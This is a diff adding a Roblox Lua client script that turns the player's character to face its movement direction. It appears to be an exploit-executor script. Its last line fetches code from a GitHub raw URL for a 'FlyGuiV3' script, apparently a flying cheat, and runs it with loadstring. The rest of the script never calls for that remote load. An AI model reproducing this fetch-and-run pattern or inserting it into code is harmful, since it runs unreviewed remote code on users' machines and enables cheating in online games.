@@ -1,0 +1,27 @@
+local Player = game:GetService("Players").LocalPlayer
+
+local spinning = true
+local spinSpeed = 1
+
+local function spin()
+    local char = Player.Character
+    if not char then return end
+    local hum = char:FindFirstChild("Humanoid")
+    local root = char:FindFirstChild("HumanoidRootPart")
+    if not hum or not root then return end
+    while spinning and char.Parent do
+        if hum.MoveDirection.Magnitude > 0 then
+            root.CFrame = CFrame.new(root.Position, root.Position + hum.MoveDirection)
+        end
+        task.wait()
+    end
+end
+
+task.spawn(spin)
+
+Player.CharacterAdded:Connect(function()
+    task.wait(0.3)
+    if spinning then task.spawn(spin) end
+end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
